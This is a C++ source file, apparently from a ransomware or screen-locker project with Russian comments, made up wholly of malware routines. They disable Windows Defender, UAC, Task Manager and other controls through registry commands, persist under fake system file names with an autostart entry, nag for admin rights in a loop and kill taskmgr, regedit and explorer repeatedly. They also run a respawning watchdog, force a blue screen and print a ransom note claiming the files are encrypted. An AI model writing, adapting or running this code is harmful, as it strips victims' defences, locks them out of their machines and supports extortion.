#include "include.h"
#include "pers.h"

namespace persistence {
bool isUserAdmin() {
    BOOL isAdminFlag = FALSE;
    BYTE adminSid[SECURITY_MAX_SID_SIZE]; // Буфер для хранения SID
    DWORD sidSize = sizeof(adminSid);

    if (!CreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, &adminSid, &sidSize)) return false;
    if (!CheckTokenMembership(NULL, &adminSid, &isAdminFlag)) return false;
    return isAdminFlag != FALSE;
}   

void DefenderOwner(){
    // Отключение Defender
    system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f");

    system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f");
    system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f");
    system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f");
    system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f");
    system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableIOAVProtection /t REG_DWORD /d 1 /f");

	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
	system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
    // Отключение UAC
    system("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f");
}

bool checkAndCreateFile(const std::string& filename) {
    std::string fullPath = "C:\\Windows\\SysWOW64\\" + filename; // Файл-чекпоинт создается только один раз

    std::ifstream file(fullPath);
    if (file) {
        return 1;
    }
    else {
        std::ofstream newFile(fullPath);
        if (newFile) {
            return 0;
        }
    }
    return 0;
}

void addToStartup() {
    char path[MAX_PATH];
    // Получаем путь к текущему исполняемому файлу
    GetModuleFileName(NULL, path, MAX_PATH);
    
    // Добавление в реестр для автозагрузки
    std::string command = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsDriverFoundation /t REG_SZ /d \"" + std::string(path) + "\" /f";
    system(command.c_str());
}

void reset() {  // краш системы 
	// Try to force **BSOD** first
	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
	// This isn't even an exploit, it's just an undocumented feature.
    HMODULE ntdll = LoadLibraryA("ntdll");
    FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
    FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

    if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
        BOOLEAN tmp1; DWORD tmp2;
        ((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
        ((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0294823, 0, 0, 0, 6, &tmp2);
    }
}

void restartSystem() {  // запасная функция взял ее с форума
    std::cout << "restarting" << std::endl;

    // меньше нельзя ставить иначе не все изменения реестра сохраняются на слабых пк
    Sleep(1500);

    // Перезагрузка системы
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    // Открываем токен текущего процесса
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "Error obtaining privileges!" << std::endl;
        return;
    }

    // Получаем привилегию SE_SHUTDOWN_NAME
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // токен привилегии
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
    if (GetLastError() != ERROR_SUCCESS) {
        std::cerr << "Error setting privileges!" << std::endl;
        return;
    }

    // Выполняем перезагрузку
    if (!ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER)) {
        std::cerr << "Error while trying to reboot!" << std::endl;
    }
}

void restartAsAdmin() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
  
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpVerb = "runas"; // Запрос UAC
    sei.lpFile = path;
    sei.hwnd = NULL;
    sei.nShow = SW_SHOWNORMAL;
  
    if (!ShellExecuteExA(&sei)) {
        DWORD err = GetLastError();
        if (err == ERROR_CANCELLED) {
            // Пользователь нажал "Нет", повторяем запуск
            Sleep(2000); // Ждём перед повтором
            restartAsAdmin();
        }
    }
}

int copyAndRunSelf() {
    // Путь к текущему исполняемому файлу
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    
    // Проверяем, находится ли программа уже в C:\Windows\SysWOW64
    if (strstr(path, "C:\\Windows\\SysWOW64\\") != NULL) {
        return 0;
    }
    if (strstr(path, "C:\\Windows\\System32\\") != NULL) {
        return 2;
    }
    // Копируем и запускаем
    CopyFile(path, "C:\\Windows\\SysWOW64\\WindowsDriverFoundation.exe", FALSE);
    ShellExecute(NULL, "runas", "C:\\Windows\\SysWOW64\\WindowsDriverFoundation.exe", NULL, NULL, SW_HIDE);
    CopyFile(path, "C:\\Windows\\System32\\ShellHost.exe", FALSE);
    ShellExecute(NULL, "runas", "C:\\Windows\\System32\\ShellHost.exe", NULL, NULL, SW_HIDE);
    return 1;
}

void cleanreg() {
    system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /f");
    system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /f");
    system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableBehaviorMonitoring /f");
    system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableScanOnRealtimeEnable /f");
    system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableOnAccessProtection /f");
    system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableIOAVProtection /f");
    system("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 1 /f");

    system("REG DELETE hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /f");
	system("REG DELETE hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /f");
	system("REG DELETE hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /f");
	system("reg DELETE HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /f");
	system("reg DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /f");
	system("reg DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /f");
	system("reg DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /f");
    system("REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsDriverFoundation /f");
    system("REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v winlogon /f");
}

void cleanfile() {
    const char* filePath = "C:\\Windows\\SysWOW64\\lafkildatnn.dat";
    if (DeleteFile(filePath)) {
        std::cout << "File successfully deleted!" << std::endl;
    }
    DeleteFile("C:\\Windows\\SysWOW64\\adskisatana666.exe");
}

std::string getDiskSerial() {
    DWORD serialNum = 0;
    if (GetVolumeInformation("C:\\", NULL, 0, &serialNum, NULL, NULL, NULL, 0)) {
        return std::to_string(serialNum);
    }
    return "unknown";
}

void CopyFileToSysWow64(std::string destPath, std::string filename) {
    // Получаем имя пользователя
    char username[256];
    DWORD size = 256;
    GetUserNameA(username, &size);
    // Строим путь к исходному файлу
    std::string sourcePath = "C:\\Users\\" + std::string(username) + "\\AppData\\Local\\Temp\\" + filename;
    // Копируем файл
    CopyFile(sourcePath.c_str(), destPath.c_str(), TRUE);
}

void StopExe() {
    while (true) {
        system("taskkill /F /IM taskmgr.exe >nul 2>&1");  // Закрываем диспетчер задач
        system("taskkill /F /IM regedit.exe >nul 2>&1");  // Закрываем редактор реестра
        system("taskkill /F /IM explorer.exe >nul 2>&1"); // Временно 
        std::this_thread::sleep_for(std::chrono::milliseconds(300));
    }
}
bool isProcessRunning(const char* exeName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        return false;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, exeName) == 0) {
                CloseHandle(hSnap);
                return true;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return false;
}
void watchdogLoop() {
    const char* targetPath = "C:\\Windows\\SysWOW64\\WindowsDriverFoundation.exe";
    const char* exeName = "WindowsDriverFoundation.exe";
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
    while (true) {
        if (!isProcessRunning(exeName)) {
            ShellExecuteA(NULL, "open", targetPath, NULL, NULL, SW_SHOW);
        }
        CopyFileA(currentPath, targetPath, TRUE);
        Sleep(5000);
    }
}
void deleteMainFiles() {
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
    system("taskkill /F /IM ShellHost.exe >nul 2>&1");
    system("del /F /Q C:\\Windows\\System32\\ShellHost.exe >nul 2>&1");
    char cmd[MAX_PATH * 2];
    sprintf(cmd, "cmd /C ping localhost -n 2 >nul && del /F /Q \"%s\"", currentPath);
    ShellExecuteA(NULL, "open", "cmd.exe", (std::string("/C ") + cmd).c_str(), NULL, SW_HIDE);

    ExitProcess(0);
}
void RemoveCloseButton(){
    HWND hwnd = GetConsoleWindow();
    LONG style = GetWindowLong(hwnd, GWL_STYLE);

    style &= ~WS_SYSMENU; 
    SetWindowLong(hwnd, GWL_STYLE, style);
    SetWindowPos(hwnd, nullptr, 0, 0, 0, 0,
        SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_FRAMECHANGED);

        
}
void ForceConsoleToFront() {
    while(true){
        HWND hwnd = GetConsoleWindow();

        ShowWindow(hwnd, SW_RESTORE);
        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0,
                     SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);

        SetForegroundWindow(hwnd);
        Sleep(2500);
    }
}
void CryptMessage(){
    std::cout << R"(

██╗  ██╗ █████╗  ██████╗██╗  ██╗ █████╗ ██████╗ ███████╗███╗   ███╗██╗ ██████╗
██║  ██║██╔══██╗██╔════╝██║ ██║ ██╔══██╗██╔══██╗██╔════╝████╗ ████║██║██╔════╝
███████║███████║██║     █████║  ███████║██║  ██║█████╗  ██╔████╔██║██║██║     
██╔══██║██╔══██║██║     ██╔═██║ ██╔══██║██║  ██║██╔══╝  ██║╚██╔╝██║██║██║     
██║  ██║██║  ██║╚██████╗██║  ██║██║  ██║██████╔╝███████╗██║ ╚═╝ ██║██║╚██████╗
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝     ╚═╝╚═╝ ╚═════╝

> All your important files have been encrypted.

> The system has been compromised by HACKADEMIC.

> Resistance is useless. Backups have been wiped. Recovery is impossible without our private key.

> Any attempts to restore files manually may result in permanent data loss.

> This is not a joke. This is your reality now.

    )" << std::endl;
}
} // namespace persistence
